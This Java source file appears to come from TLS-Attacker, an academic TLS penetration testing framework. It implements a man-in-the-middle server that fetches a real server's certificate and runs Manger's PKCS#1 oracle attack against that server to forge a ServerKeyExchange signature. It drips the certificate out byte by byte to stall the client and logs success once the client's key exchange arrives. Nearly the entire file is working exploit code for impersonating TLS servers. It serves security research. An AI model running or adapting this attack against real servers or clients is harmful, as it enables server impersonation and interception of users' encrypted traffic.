/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS.
 *
 * Copyright (C) 2015 Chair for Network and Data Security,
 *                    Ruhr University Bochum
 *                    (juraj.somorovsky@rub.de)
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package de.rub.nds.tlsattacker.custom.tls.server;

import de.rub.nds.tlsattacker.attacks.pkcs1.Manger;
import de.rub.nds.tlsattacker.attacks.pkcs1.oracles.RealDirectMessagePkcs1Oracle;
import de.rub.nds.tlsattacker.custom.tls.server.config.MitmConfig;
import de.rub.nds.tlsattacker.tls.config.ClientCommandConfig;
import de.rub.nds.tlsattacker.tls.constants.ProtocolVersion;
import de.rub.nds.tlsattacker.tls.constants.ProtocolMessageType;
import de.rub.nds.tlsattacker.tls.constants.CipherSuite;
import de.rub.nds.tlsattacker.tls.constants.HandshakeMessageType;
import de.rub.nds.tlsattacker.tls.constants.RecordByteLength;
import de.rub.nds.tlsattacker.tls.util.CertificateFetcher;
import de.rub.nds.tlsattacker.util.ArrayConverter;
import de.rub.nds.tlsattacker.util.RandomHelper;
import de.rub.nds.tlsattacker.util.Time;
import java.io.InputStream;
import java.io.OutputStream;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.cert.CertificateEncodingException;
import java.security.interfaces.RSAPublicKey;
import java.util.Arrays;
import java.util.LinkedList;
import java.util.List;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.bouncycastle.jce.provider.X509CertificateObject;

/**
 * 
 * Timing: Chrome 30 sek, firefox 6min
 * 
 * @author juraj
 */
public class Server extends Thread {

    public static Logger LOGGER = LogManager.getLogger(Server.class);

    private static final String LOCAL_CERT_MESSAGE = "0b0002280002250002223082021e308201870204507c6eae300d06092a864886f70d01010505003056310b3009060355040613024445310c300a06035504080c034e5257310f300d06035504070c06426f6368756d310c300a060355040a0c03484749310c300a060355040b0c03525542310c300a06035504030c03525542301e170d3132313031353230313433385a170d3133313031353230313433385a3056310b3009060355040613024445310c300a06035504080c034e5257310f300d06035504070c06426f6368756d310c300a060355040a0c03484749310c300a060355040b0c03525542310c300a06035504030c0352554230819f300d06092a864886f70d010101050003818d003081890281810080c29bd12a9891a5824f4afa757c1bf072bcfbfdfa0f55e3522fbb510bd2699ada4d7882ddf950328e52b31557de862374d0ef7f7a2d5be57744f5dd99f25e50a785910cd588b764c600e6bc1379e815f5e25e903586c61011b3b4102ade60ce582218f6eb479fc671130622c21011f7f6d19f7bba2c9472578e14ca65884af30203010001300d06092a864886f70d0101050500038181003f9818b16ea3b2bb6dc959f127548c33bfb5edd559215530f1da4eaf461aae8201b95bcc70aa9fbc6ba5a24b2f38c135c4a4bf611ee340f3a2fb02b5f9df53dca8e0a39678b67104ac3fc0c2bc24343cc0f2832c2a4864b0c96df56c3151827a47f58538b409d911824300bb8c1c2f2299b7830318f90ec226d2e70ce28da954";

    private MitmConfig config;

    private boolean serverHelloSent;

    private boolean serverCertSent;

    private boolean serverHelloDoneSent;

    private boolean ccsSent;

    private boolean serverKeyExchangeSent;

    private byte[] clientRandom;

    private byte[] serverRandom;

    private RSAPublicKey rsaPublicKey;

    private X509CertificateObject cert;

    private MangerExecutor mangerExecutor;

    private InputStream in;

    private OutputStream out;

    private Exception ex;

    private long connectionStarted;

    private boolean running;

    public Server(MitmConfig config, InputStream in, OutputStream out) {
	this.config = config;
	this.in = in;
	this.out = out;
	this.running = true;
    }

    @Override
    public void run() {
	LOGGER.info("New connection accepted");
	connectionStarted = System.currentTimeMillis();
	try {
	    List<CipherSuite> ciphers = new LinkedList<>();
	    ciphers.add(CipherSuite.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA);
	    cert = CertificateFetcher.fetchServerCertificate(config.getConnect(), ciphers);
	    rsaPublicKey = (RSAPublicKey) cert.getPublicKey();
	    LOGGER.info("Certificate fetched: {} ", cert);

	    byte[] input = new byte[1000];
	    int len;
	    while ((len = in.read(input, 0, input.length)) != -1) {
		LOGGER.debug("Received: " + ArrayConverter.bytesToHexString(input, len));
		if (input[5] == 0x10) {
		    LOGGER.info("----------------------------------------------");
		    LOGGER.info("Attack successful, ClientKeyExchange received!");
		    LOGGER.info("----------------------------------------------");
		}
		if (!serverHelloSent) {
		    byte[] tlsVersion = Arrays.copyOfRange(input, 9, 11);
		    if (ProtocolVersion.getProtocolVersion(tlsVersion) != ProtocolVersion.TLS12) {
			try {
			    LOGGER.info("Only TLS1.2 version is supported by the MITM server");
			    out.close();
			    in.close();
			} finally {
			    return;
			}
		    }
		    clientRandom = Arrays.copyOfRange(input, 11, 43);
		    LOGGER.info("Client Random: " + ArrayConverter.bytesToHexString(clientRandom));
		}
		while (sendMessage(out))
		    ;
	    }
	} catch (Exception e) {
	    ex = e;
	    LOGGER.error(ex.getLocalizedMessage());
	    ex.printStackTrace();
	    mangerExecutor.setInterrupted();
	    LOGGER.info("Connection lost. It was here for {} milliseconds.",
		    (System.currentTimeMillis() - connectionStarted));
	} finally {
	    running = false;
	}
    }

    /**
     * 
     * @param out
     * @return True if the server has to send next handshake message, False
     *         otherwise
     * @throws Exception
     */
    private boolean sendMessage(OutputStream out) throws Exception {
	byte[] record;
	if (!serverHelloSent) {
	    byte[] serverHello = createServerHello();
	    record = createRecord(ProtocolMessageType.HANDSHAKE, serverHello);
	    LOGGER.info("Server Hello Record (length: " + record.length + "): "
		    + ArrayConverter.bytesToHexString(record));
	    out.write(record);
	    serverHelloSent = true;
	    return true;
	} else if (!serverCertSent) {
	    long time = System.currentTimeMillis();
	    byte[] serverCert = createServerCertificate();
	    record = createRecord(ProtocolMessageType.HANDSHAKE, serverCert);
	    LOGGER.info("Server Certificate Record (length: " + record.length + "): "
		    + ArrayConverter.bytesToHexString(record));
	    if (config.getDelay() != 0) {
		if (config.isSplitCertificate()) {
		    for (int i = 0; i < serverCert.length; i++) {
			record = createRecord(ProtocolMessageType.HANDSHAKE, Arrays.copyOfRange(serverCert, i, i + 1));
			out.write(record);
			if (i % 100 == 0) {
			    LOGGER.info("Sending certificate. Bytes sent: {}", i);
			}
			Thread.sleep(config.getDelay());

			// for (int i = 0; i < record.length; i++) {
			// out.write(record, i, 1);
			// if (i % 100 == 0) {
			// LOGGER.info("Sending certificate. Bytes sent: {}",
			// i);
			// }
			// Thread.sleep(config.getDelay());
			// }
		    }
		} else {
		    out.write(record);
		    Thread.sleep(config.getDelay());
		}
	    } else {
		LOGGER.info("Sending certificate at once.");
		out.write(record);
	    }
	    long diff = System.currentTimeMillis() - time;
	    LOGGER.info("Time for sending a cert [sec]: " + (diff / 1000));
	    serverCertSent = true;
	    return true;
	} else if (!serverKeyExchangeSent) {
	    byte[] serverKeyExchange = createServerKeyExchange();
	    record = createRecord(ProtocolMessageType.HANDSHAKE, serverKeyExchange);
	    out.write(record);
	    LOGGER.info("Server Key Exchange Record (length: " + record.length + "): "
		    + ArrayConverter.bytesToHexString(record));
	    serverKeyExchangeSent = true;
	    return true;
	} else if (!serverHelloDoneSent) {
	    byte[] serverHelloDone = createServerHelloDone();
	    record = createRecord(ProtocolMessageType.HANDSHAKE, serverHelloDone);
	    out.write(record);
	    LOGGER.info("Server Hello Done Record (length: " + record.length + "): "
		    + ArrayConverter.bytesToHexString(record));
	    serverHelloDoneSent = true;
	    return false;
	} else if (!ccsSent) {
	    byte[] ccs = { 0x01 };
	    record = createRecord(ProtocolMessageType.CHANGE_CIPHER_SPEC, ccs);
	    LOGGER.info("Server CCS Record (length: " + record.length + "): " + ArrayConverter.bytesToHexString(record));
	    out.write(record);
	    out.flush();

	    byte[] finished = createFinished();
	    record = createRecord(ProtocolMessageType.HANDSHAKE, finished);
	    out.write(record);
	    out.flush();
	    LOGGER.info("Server Finished Record (length: " + record.length + "): "
		    + ArrayConverter.bytesToHexString(record));
	}
	return false;
    }

    private byte[] createFinished() {
	byte[] type = HandshakeMessageType.FINISHED.getArrayValue();
	byte[] length = new byte[3];
	byte[] data = new byte[44];
	length[2] = (byte) data.length;
	return ArrayConverter.concatenate(type, length, data);
    }

    private byte[] createServerHelloDone() {
	byte[] shd = { 0x0e, 0x00, 0x00, 0x00 };
	return shd;
    }

    private byte[] createServerHello() throws NoSuchAlgorithmException {
	byte[] type = HandshakeMessageType.SERVER_HELLO.getArrayValue();
	byte[] version = ProtocolVersion.TLS12.getValue();
	byte[] time = ArrayConverter.longToUint32Bytes(Time.getUnixTime());
	byte[] random = new byte[28];
	RandomHelper.getRandom().nextBytes(random);
	byte[] sessionIdLength = { 0x00 };
	byte[] cipher = CipherSuite.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA.getValue();
	byte[] compression = { 0x00 };
	byte[] extension = { 0x00, 0x23, 0x00, 0x00 };
	byte[] extensionLength = ArrayConverter.intToBytes(0x04, 2);

	byte[] result = ArrayConverter.concatenate(version, time, random, sessionIdLength, cipher, compression,
		extensionLength, extension);
	byte[] length = ArrayConverter.intToBytes(result.length, 3);
	result = ArrayConverter.concatenate(type, length, result);

	serverRandom = ArrayConverter.concatenate(time, random);

	byte[] toSign = prepareKeyExchangeToSign();

	mangerExecutor = new MangerExecutor(toSign, config.getConnect(), rsaPublicKey);
	mangerExecutor.start();

	return result;
    }

    /**
     * Works only for 1024 bit keys...do not know why yet???
     * 
     * @return
     * @throws NoSuchAlgorithmException
     */
    private byte[] prepareKeyExchangeToSign() throws NoSuchAlgorithmException {
	// curve type: named curve
	byte[] curveType = { 0x03 };
	// curve secp256r1
	byte[] curve = { 0x00, 0x17 };
	// pub key length
	byte[] pubkeyLength = { 0x41 };
	// pub key
	BigInteger pubkey = new BigInteger(
		"04164ab5928c36d7301559440faa6356acdfc15329c72ffb66c0ec98e97f7c597560b75c3fbc38cef8e33a331bee0e9dc57641202cc697b2173187448956b405b7",
		16);

	byte[] digestInput = ArrayConverter.concatenate(curveType, curve, pubkeyLength, pubkey.toByteArray());

	MessageDigest digest = MessageDigest.getInstance("SHA-256");
	digest.update(clientRandom);
	digest.update(serverRandom);
	digest.update(digestInput);
	byte[] digestOutput = digest.digest();

	// // signature padding including asn1 string
	// byte[] sigPadding = { 0x00, (byte) 0x01, (byte) 0xFF, (byte) 0xFF,
	// (byte) 0xFF, (byte) 0xFF, (byte) 0xFF,
	// (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF,
	// (byte) 0xFF, (byte) 0xFF, (byte) 0xFF,
	// (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF,
	// (byte) 0xFF, (byte) 0xFF, (byte) 0xFF,
	// (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF,
	// (byte) 0xFF, (byte) 0xFF, (byte) 0xFF,
	// (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF,
	// (byte) 0xFF, (byte) 0xFF, (byte) 0xFF,
	// (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF,
	// (byte) 0xFF, (byte) 0xFF, (byte) 0xFF,
	// (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF,
	// (byte) 0xFF, (byte) 0xFF, (byte) 0xFF,
	// (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF,
	// (byte) 0xFF, (byte) 0xFF, (byte) 0xFF,
	// (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF,
	// (byte) 0xFF, (byte) 0xFF, (byte) 0xFF,
	// (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF,
	// (byte) 0x00, (byte) 0x30, (byte) 0x31,
	// (byte) 0x30, (byte) 0x0D, (byte) 0x06, (byte) 0x09, (byte) 0x60,
	// (byte) 0x86, (byte) 0x48, (byte) 0x01,
	// (byte) 0x65, (byte) 0x03, (byte) 0x04, (byte) 0x02, (byte) 0x01,
	// (byte) 0x05, (byte) 0x00, (byte) 0x04,
	// (byte) 0x20 };
	byte[] keyExchange = { (byte) 0x00, (byte) 0x30, (byte) 0x31, (byte) 0x30, (byte) 0x0D, (byte) 0x06,
		(byte) 0x09, (byte) 0x60, (byte) 0x86, (byte) 0x48, (byte) 0x01, (byte) 0x65, (byte) 0x03, (byte) 0x04,
		(byte) 0x02, (byte) 0x01, (byte) 0x05, (byte) 0x00, (byte) 0x04, (byte) 0x20 };

	int keyExchangePaddingLength = (rsaPublicKey.getModulus().bitLength() / 8) - keyExchange.length
		- digestOutput.length;
	byte[] keyExchangePadding = new byte[keyExchangePaddingLength];
	keyExchangePadding[0] = 0x00;
	keyExchangePadding[1] = 0x01;
	for (int i = 2; i < keyExchangePadding.length; i++) {
	    keyExchangePadding[i] = (byte) 0xFF;
	}

	System.out
		.println(ArrayConverter.bytesToHexString(ArrayConverter.concatenate(keyExchangePadding, keyExchange)));
	// System.out.println(ArrayConverter.bytesToHexString(sigPadding));

	return ArrayConverter.concatenate(keyExchangePadding, keyExchange, digestOutput);
	// return ArrayConverter.concatenate(sigPadding, digestOutput);
    }

    private byte[] createServerKeyExchange() throws Exception {
	byte[] type = HandshakeMessageType.SERVER_KEY_EXCHANGE.getArrayValue();
	// curve type: named curve
	byte[] curveType = { 0x03 };
	// curve secp256r1
	byte[] curve = { 0x00, 0x17 };
	// pub key length
	byte[] pubkeyLength = { 0x41 };
	// pub key
	BigInteger pubkey = new BigInteger(
		"04164ab5928c36d7301559440faa6356acdfc15329c72ffb66c0ec98e97f7c597560b75c3fbc38cef8e33a331bee0e9dc57641202cc697b2173187448956b405b7",
		16);
	// signature hash algorithm: sha256, rsa
	byte[] sigHash = { 0x04, 0x01 };
	// signature length
	byte[] sigLength = { 0x00, (byte) 0x80 };

	mangerExecutor.join();
	byte[] signature = mangerExecutor.result.toByteArray();

	byte[] result = ArrayConverter.concatenate(curveType, curve, pubkeyLength, pubkey.toByteArray(), sigHash,
		sigLength, signature);
	// byte[] result = tmp.toByteArray();
	byte[] length = ArrayConverter.intToBytes(result.length, 3);
	result = ArrayConverter.concatenate(type, length, result);

	return result;
    }

    private byte[] createServerCertificate() throws CertificateEncodingException {
	BigInteger bi = new BigInteger(LOCAL_CERT_MESSAGE, 16);
	return bi.toByteArray();
    }

    private byte[] createRecord(ProtocolMessageType contentType, byte[] data) {
	byte[] result = null;

	switch (contentType) {
	    case HANDSHAKE:
		result = ArrayConverter.concatenate(ProtocolMessageType.HANDSHAKE.getArrayValue(),
			ProtocolVersion.TLS12.getValue(),
			ArrayConverter.intToBytes(data.length, RecordByteLength.RECORD_LENGTH), data);
		break;
	    case CHANGE_CIPHER_SPEC:
		result = ArrayConverter.concatenate(ProtocolMessageType.CHANGE_CIPHER_SPEC.getArrayValue(),
			ProtocolVersion.TLS12.getValue(),
			ArrayConverter.intToBytes(data.length, RecordByteLength.RECORD_LENGTH), data);
		break;
	}

	return result;
    }

    class MangerExecutor extends Thread {

	BigInteger result;

	Manger attacker;

	MangerExecutor(byte[] message, String connect, RSAPublicKey rsaPublicKey) {
	    ClientCommandConfig clientConfig = new ClientCommandConfig();
	    clientConfig.setMaxTransportResponseWait(config.getMaxTransportResponseWait());
	    clientConfig.setConnect(connect);
	    RealDirectMessagePkcs1Oracle oracle = new RealDirectMessagePkcs1Oracle(rsaPublicKey, clientConfig);
	    attacker = new Manger(message, oracle);
	    LOGGER.info("Manger's attacker initialized");
	}

	@Override
	public void run() {
	    LOGGER.info("Starting the attacker");
	    attacker.attack();
	    result = attacker.getSolution();
	    if (result != null) {
		LOGGER.info("Attack result: " + ArrayConverter.bytesToHexString(result.toByteArray()));
	    }
	}

	public void setInterrupted() {
	    attacker.setInterrupted(true);
	}
    }

    public Exception getException() {
	return ex;
    }

    public boolean isRunning() {
	return running;
    }

    public void setRunning(boolean running) {
	this.running = running;
    }
}
